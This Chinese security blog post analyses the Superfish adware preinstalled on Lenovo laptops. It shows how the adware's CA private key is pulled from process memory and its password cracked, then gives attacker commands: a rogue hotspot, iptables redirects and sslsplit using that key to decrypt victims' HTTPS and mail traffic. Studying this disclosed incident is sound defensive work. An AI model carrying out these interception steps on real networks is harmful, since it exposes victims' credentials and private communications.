# 我从Superfish事件中学到的

0x00 前言 & superfish事件
=====================

* * *

Superfish这个事件，国内外报道的都很多，不过我个人感觉国内对漏洞事件的敏感度挺高，都是抢先第一个翻译报道，但是很少看到细节分析。国外的研究者在自己的博客有一些分析，我提取出来和大家分享学习，有理解不对的地方还希望指正。

联想笔记本用户从去年年中开始在官方论坛上报告他们的电脑预装了广告软件Superfish，Superfish会在用户电脑上安装自签名证书，劫持用户浏览的HTTPS/HTTP网页，劫持搜索结果，在Google搜索页面及其它网站上注入广告。联想客服代表Mark Hopkins证实Superfish是该公司预装在电脑中的，用户投诉之后他们已从系统中将该软件临时移除,这次事件给联想公司带来一连串公关灾难,联想宣布到Windows 10发布时，上市的联想电脑将会运行纯净的操作系统，不再捆绑第三方的臃肿软件（bloatware）,同时向受Superfish影响的客户提供6个月的McAfee LiveSafe安全软件服务,并提供移除工具（https://github.com/lenovo-inc/superfishremoval）。

0x01 superfish软件对用户上网的影响
========================

* * *

Superfish软件在安装的时候默认会把文件释放到 C:\Program Files\Lenovo\VisualDiscovery，然后执行下面命令

```
run.exe 30000 VisualDiscovery.exe /Auto /Service
run.exe 30000 C:\WINDOWS\system32\sc.exe start VisualDiscovery
run.exe 30000 VDWFPInstaller.exe install

```

superfish基于Komodia的引擎，他会注册服务，并且安装驱动，这些驱动文件也都有自己的签名，不过已经过期了。安装目录有个VDWFP.pdb文件，是使用WFP(Windows Filtering Platform)实现连接重定向的，也会在注册表添加HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VDWFP项，包括要劫持的应用程序列表，不劫持的IP地址，劫持端口等信息。还会开放23154，23156，23160端口实现代理，方便中间人攻击。SuperfishCert.dll文件的作用是安装恶意证书到应用程序，VisualDiscovery.exe使用OpenSSL的静态链接文件，包含公共密钥是私有密钥，但是我逆向基础差，没有从这里看到，而是通过dump出的内存找到的，下一节会有介绍。

![enter image description here](http://drops.javaweb.org/uploads/images/3e9efb3b13ed06a53346d9f68d7af63f32527103.jpg)

此时你在访问HTTPS网站的时候，浏览器里显示的SSL证书的颁发颁发机构(CA)会是superfish，而不是常见的VeriSign，如图：

![enter image description here](http://drops.javaweb.org/uploads/images/779fca1c32708ec208d71ee87b6910605fbaa725.jpg)

Superfish的目的是在用户电脑上安装自签名证书，劫持用户浏览的HTTPS/HTTP网页，插入广告。从上可以知道superfish本身也是认证机构(CA)，如果我们能够得到CA的私钥， 自签名证书，还能做更多有意思的事情。

0x02 提取CA私钥
===========

* * *

首先使用procdump工具dump出VisualDiscovery.exe进程的内存信息

```
procdump -ma VisualDiscovery.exe super.dmp

```

然后使用strings小工具提取super.dmp 中的字符串，如图

```
Strings.exe super.dmp > stringsuper.txt

```

![enter image description here](http://drops.javaweb.org/uploads/images/fa54c2a0c716e2f401631bc4710f0652d6afb59e.jpg)

在stringsuper.txt文件中搜索"PRIVATE KEY"，可以看到证书信息，把相关信息COPY出来（https://github.com/robertdavidgraham/pemcrack/blob/master/test.pem），然后用openssl导入证书和密钥,确提示输入密码

![enter image description here](http://drops.javaweb.org/uploads/images/2f88d07e9276d9fb45ffc08d24b280287c74870d.jpg)

老外有放出来一个单线程的破解工具（https://github.com/robertdavidgraham/pemcrack），还是使用stringsuper.txt里的单词当字典进行破解

提取字典

```
grep "^[a-z]*$" stringsuper.txt | sort | uniq > super.dict

```

编译工具，破解

![enter image description here](http://drops.javaweb.org/uploads/images/fa9ab032f4b4a2222ec06db378563d253a2c97b0.jpg)

得到密码是komodia

![enter image description here](http://drops.javaweb.org/uploads/images/c6c3ac05b8062e99b2a1ca7684bc3a9291d2a875.jpg)

0x03 作恶
=======

* * *

得到认证机构(CA)的私钥后，任何人都可以以该机构的身份颁发证书了。比如利用superfish的CA私钥给恶意软件做签名逃避主动防御和杀毒，mcafee已经发现有真实的互联网攻击了（https://blogs.mcafee.com/mcafee-labs/superfish-root-certificate-used-sign-malware）

![enter image description here](http://drops.javaweb.org/uploads/images/43028b8540ea108f9c154c358f542f9459cfec48.jpg)

其他的攻击利用场景：受害者机器已经安装了superfish软件,在一个不可信的网络内（比如共享WIFI），自己的上网流量可以被重定向（比如攻击者通过ARP/修改受害者机器网关/修改受害者机器的DNS配置等方法）；攻击者的平台使用的是KALI，使用hostapd做了一个无线热点，然后用sslsplit(https://github.com/droe/sslsplit)做中间人劫持，sslsplit比mitmproxy好的地方是，他还能支持其他基于TLS/SSL的流量，比如像FTPS,SMTP OVER SSL，IMAP OVER SSL等，操作步骤如下：

导出证书和私钥

```
root@kali:~# openssl rsa -in test.pem -out ca.key
root@kali:~#cat ca.cer
-----BEGIN CERTIFICATE-----
MIIC9TCCAl6gAwIBAgIJANL8E4epRNznMA0GCSqGSIb3DQEBBQUAMFsxGDAWBgNV
BAoTD1N1cGVyZmlzaCwgSW5jLjELMAkGA1UEBxMCU0YxCzAJBgNVBAgTAkNBMQsw
CQYDVQQGEwJVUzEYMBYGA1UEAxMPU3VwZXJmaXNoLCBJbmMuMB4XDTE0MDUxMjE2
MjUyNloXDTM0MDUwNzE2MjUyNlowWzEYMBYGA1UEChMPU3VwZXJmaXNoLCBJbmMu
MQswCQYDVQQHEwJTRjELMAkGA1UECBMCQ0ExCzAJBgNVBAYTAlVTMRgwFgYDVQQD
Ew9TdXBlcmZpc2gsIEluYy4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAOjz
Shh2Xxk/sc9Y6X9DBwmVgDXFD/5xMSeBmRImIKXfj2r8QlU57gk4idngNsSsAYJb
1Tnm+Y8HiN/+7vahFM6pdEXY/fAXVyqC4XouEpNarIrXFWPRt5tVgA9YvBxJ7SBi
3bZMpTrrHD2g/3pxptMQeDOuS8Ic/ZJKocPnQaQtAgMBAAGjgcAwgb0wDAYDVR0T
BAUwAwEB/zAdBgNVHQ4EFgQU+5izU38URC7o7tUJml4OVoaoNYgwgY0GA1UdIwSB
hTCBgoAU+5izU38URC7o7tUJml4OVoaoNYihX6RdMFsxGDAWBgNVBAoTD1N1cGVy
ZmlzaCwgSW5jLjELMAkGA1UEBxMCU0YxCzAJBgNVBAgTAkNBMQswCQYDVQQGEwJV
UzEYMBYGA1UEAxMPU3VwZXJmaXNoLCBJbmMuggkA0vwTh6lE3OcwDQYJKoZIhvcN
AQEFBQADgYEApHyg7ApKx3DEcWjzOyLi3JyN0JL+c35yK1VEmxu0Qusfr76645Oj
1IsYwpTws6a9ZTRMzST4GQvFFQra81eLqYbPbMPuhC+FCxkUF5i0DNSWi+kczJXJ
TtCqSwGl9t9JEoFqvtW+znZ9TqyLiOMw7TGEUI+88VAqW0qmXnwPcfo=
-----END CERTIFICATE-----

```

在kali上安装sslsplit

```
root@kali:~# git clone https://github.com/droe/sslsplit
root@kali:~# cd  sslsplit/
root@kali:~/sslsplit# make -j 10
root@kali:~/sslsplit# make install

```

SSLsplit会监听2个端口，8080（用于非SSL连接），8443（用于SSL连接），为了能够通过这2端口转发流量到受害者的机器，还需要用iptables做下端口重定向。

```
root@kali:~# sysctl -w net.ipv4.ip_forward=1
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443

```

然后攻击者执行

```
root@kali:~# sslsplit -D -l connections.log -S /var/log/sslsplit -k ca.key -c ca.cer ssl 0.0.0.0 8443

```

![enter image description here](http://drops.javaweb.org/uploads/images/a000a8cff206798790ebaad2486b096fa6b75fdb.jpg)

这样受害者再访问有HTTPS的网站时，所有会话信息会保存到/var/log/sslsplit。

这个思路也有被用在bkpctf中 (http://mweissbacher.com/blog/2015/03/01/boston-key-party-2015-kendall-challenge-superfish/)

0x04 参考
=======

* * *

```
<<图解密码技术>>
http://blog.kaspersky.com/lenovo-pc-with-adware-superfish-preinstalled/
http://www.0xebfe.net/blog/2015/02/20/the-analysis-of-superfish-adware/
http://blog.erratasec.com/2015/02/extracting-superfish-certificate.html
http://blog.erratasec.com/2015/02/exploiting-superfish-certificate.html
http://kinozoa.com/blog/exploiting-superfish-subterfuge/
http://blog.trendmicro.com/trendlabs-security-intelligence/extended-validation-certificates-warning-against-mitm-attacks/

```